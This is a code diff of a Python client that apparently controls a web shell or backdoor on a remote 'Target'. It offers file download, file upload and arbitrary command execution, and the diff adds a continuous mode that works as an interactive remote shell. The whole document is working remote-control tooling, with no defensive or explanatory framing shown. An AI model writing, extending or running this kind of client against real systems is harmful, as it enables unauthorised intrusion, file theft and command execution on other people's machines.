@@ -127,12 +127,14 @@ def upload(local_path):
 
 def download(remote_path, local_path):
     filename = remote_path.split("/")[-1]
+    if local_path == "":
+        local_path = "./"
     log(f"Download request for {filename} from Target: {BASE_URL}")
     response = send_to_target("download", {"filepath": remote_path})
     if response["ok"]:
         try:
             data = decode(response["data"])
-            with open(local_path, 'wb+') as file:
+            with open(local_path + "/" + filename, 'wb+') as file:
                 file.write(data)
             success(f"Successfully downloaded {filename} from Target: {BASE_URL}")
         except OSError as e:
@@ -141,16 +143,22 @@ def download(remote_path, local_path):
         err(f"Error! {response["error"]}")
         err(f"Details of Error: {response["details"]}")
 
-def execute(command_to_execute):
-    log(f"Executing command: {command_to_execute} on {BASE_URL}")
+def execute(command_to_execute, mode):
+    if mode == 0:
+        log(f"Executing command: {command_to_execute} on {BASE_URL}")
     response = send_to_target("execute", {"command": command_to_execute})
-    if response["ok"]:
-        success(f"Successfully ran command {command_to_execute} on Target: {BASE_URL}")
-        success(f"Output: {response["output"]}")
-    else:
-        err(f"Error! {response["error"]}")
-        err(f"Details of Error: {response["details"]}")
-
+    try:
+        if response["ok"]:
+            if mode == 0:
+                success(f"Successfully ran command {command_to_execute} on Target: {BASE_URL}")
+                success(f"Output: {response["output"]}")
+            else:
+                print(response["output"])
+        else:
+            err(f"Error! {response["error"]}")
+            err(f"Details of Error: {response["details"]}")
+    except TypeError as e:
+        err(f"Error: {e}")
 def main():
     try:
         while True:
@@ -158,6 +166,7 @@ def main():
             print("1. Download a file")
             print("2. Upload a file")
             print("3. Execute a command")
+            print("4. Execute continuously")
             choice = int(input("Please pick a command:"))
             if choice == 1:
                 filename = input("Please enter the path to download: ")
@@ -168,7 +177,14 @@ def main():
                 upload(filename)
             elif choice == 3:
                 command = input("Enter the command to run: ")
-                execute(command)
+                execute(command, 0)
+            elif choice == 4:
+                command = ""
+                print("Enter quit to stop.")
+                while command.lower() != "quit":
+                    command = input(":")
+                    if command.lower() != "quit":
+                        execute(command, 1)
             else:
                 print("Please try again")
                 continue
